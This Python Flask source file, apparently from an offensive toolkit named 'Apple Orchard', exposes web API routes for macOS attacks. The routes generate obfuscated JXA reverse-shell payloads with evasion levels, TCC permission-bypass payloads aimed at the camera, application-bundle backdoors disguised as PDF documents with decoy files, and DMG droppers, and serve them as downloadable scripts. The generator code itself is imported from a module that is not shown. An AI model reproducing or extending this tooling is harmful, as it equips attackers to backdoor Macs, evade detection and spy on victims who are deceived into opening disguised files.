"""
🍎 The Apple Orchard - MacOS Operations Routes
Flask API for macOS attack operations
"""

from flask import Blueprint, render_template, request, jsonify, Response
import json

apple_orchard_bp = Blueprint('apple_orchard', __name__, url_prefix='/apple-orchard')

# Import the core module
try:
    from tools.apple_orchard import (
        get_apple_orchard, 
        JXAPayloadType, 
        TCCPermission, 
        BundleDisguise
    )
    APPLE_ORCHARD_AVAILABLE = True
except ImportError as e:
    print(f"[!] Apple Orchard module not available: {e}")
    APPLE_ORCHARD_AVAILABLE = False


def get_module():
    """Get Apple Orchard module instance"""
    if not APPLE_ORCHARD_AVAILABLE:
        return None
    return get_apple_orchard()


@apple_orchard_bp.route('/')
def index():
    """Apple Orchard Dashboard"""
    
    orchard = get_module()
    
    # JXA payload types
    jxa_payloads = {}
    if orchard:
        result = orchard.get_payload_types()
        if result.get("success"):
            jxa_payloads = result.get("payload_types", {})
    
    # TCC permissions
    tcc_permissions = {}
    if orchard:
        result = orchard.get_tcc_permissions()
        if result.get("success"):
            tcc_permissions = result.get("permissions", {})
    
    # Disguise types
    disguise_types = {}
    if orchard:
        result = orchard.get_disguise_types()
        if result.get("success"):
            disguise_types = result.get("disguise_types", {})
    
    return render_template('apple_orchard.html',
        jxa_payloads=jxa_payloads,
        tcc_permissions=tcc_permissions,
        disguise_types=disguise_types,
        module_available=APPLE_ORCHARD_AVAILABLE
    )


@apple_orchard_bp.route('/api/status')
def api_status():
    """Get module status"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({
            "success": False,
            "error": "Apple Orchard module not available"
        })
    
    return jsonify(orchard.get_status())


@apple_orchard_bp.route('/api/jxa/types')
def api_jxa_types():
    """Get available JXA payload types"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    return jsonify(orchard.get_payload_types())


@apple_orchard_bp.route('/api/jxa/generate', methods=['POST'])
def api_jxa_generate():
    """Generate JXA payload"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    data = request.get_json() or {}
    
    payload_type = data.get('payload_type', 'reverse_shell')
    host = data.get('host', '127.0.0.1')
    port = data.get('port', 443)
    evasion_level = data.get('evasion_level', 2)
    obfuscate = data.get('obfuscate', True)
    
    result = orchard.generate_jxa_payload(
        payload_type=payload_type,
        host=host,
        port=int(port),
        evasion_level=int(evasion_level),
        obfuscate=obfuscate
    )
    
    return jsonify(result)


@apple_orchard_bp.route('/api/tcc/permissions')
def api_tcc_permissions():
    """Get available TCC permissions"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    return jsonify(orchard.get_tcc_permissions())


@apple_orchard_bp.route('/api/tcc/generate', methods=['POST'])
def api_tcc_generate():
    """Generate TCC bypass payload"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    data = request.get_json() or {}
    
    target_app = data.get('target_app', '/usr/bin/python3')
    permissions = data.get('permissions', ['kTCCServiceCamera'])
    method = data.get('method', 'injection')
    
    result = orchard.generate_tcc_bypass(
        target_app=target_app,
        permissions=permissions,
        method=method
    )
    
    return jsonify(result)


@apple_orchard_bp.route('/api/bundle/types')
def api_bundle_types():
    """Get available bundle disguise types"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    return jsonify(orchard.get_disguise_types())


@apple_orchard_bp.route('/api/bundle/generate', methods=['POST'])
def api_bundle_generate():
    """Generate application bundle backdoor"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    data = request.get_json() or {}
    
    app_name = data.get('app_name', 'Document')
    disguise = data.get('disguise', 'pdf')
    host = data.get('host', '127.0.0.1')
    port = data.get('port', 443)
    decoy_file = data.get('decoy_file', '')
    
    result = orchard.generate_app_bundle(
        app_name=app_name,
        disguise=disguise,
        host=host,
        port=int(port),
        decoy_file=decoy_file
    )
    
    return jsonify(result)


@apple_orchard_bp.route('/api/dmg/generate', methods=['POST'])
def api_dmg_generate():
    """Generate DMG dropper"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    data = request.get_json() or {}
    
    app_name = data.get('app_name', 'Installer')
    host = data.get('host', '127.0.0.1')
    port = data.get('port', 443)
    
    result = orchard.generate_dmg_dropper(
        app_name=app_name,
        host=host,
        port=int(port)
    )
    
    return jsonify(result)


@apple_orchard_bp.route('/api/download/jxa/<payload_type>')
def api_download_jxa(payload_type):
    """Download JXA payload as file"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    host = request.args.get('host', '127.0.0.1')
    port = request.args.get('port', '443')
    
    result = orchard.generate_jxa_payload(
        payload_type=payload_type,
        host=host,
        port=int(port)
    )
    
    if not result.get("success"):
        return jsonify(result)
    
    code = result.get("code", "")
    
    return Response(
        code,
        mimetype='text/javascript',
        headers={
            'Content-Disposition': f'attachment; filename={payload_type}.js'
        }
    )


@apple_orchard_bp.route('/api/download/bundle-script')
def api_download_bundle_script():
    """Download bundle build script"""
    
    orchard = get_module()
    if not orchard:
        return jsonify({"success": False, "error": "Module not available"})
    
    app_name = request.args.get('app_name', 'Document')
    disguise = request.args.get('disguise', 'pdf')
    host = request.args.get('host', '127.0.0.1')
    port = request.args.get('port', '443')
    
    result = orchard.generate_app_bundle(
        app_name=app_name,
        disguise=disguise,
        host=host,
        port=int(port)
    )
    
    if not result.get("success"):
        return jsonify(result)
    
    script = result.get("build_script", "")
    
    return Response(
        script,
        mimetype='text/x-shellscript',
        headers={
            'Content-Disposition': f'attachment; filename=build_{app_name}.sh'
        }
    )
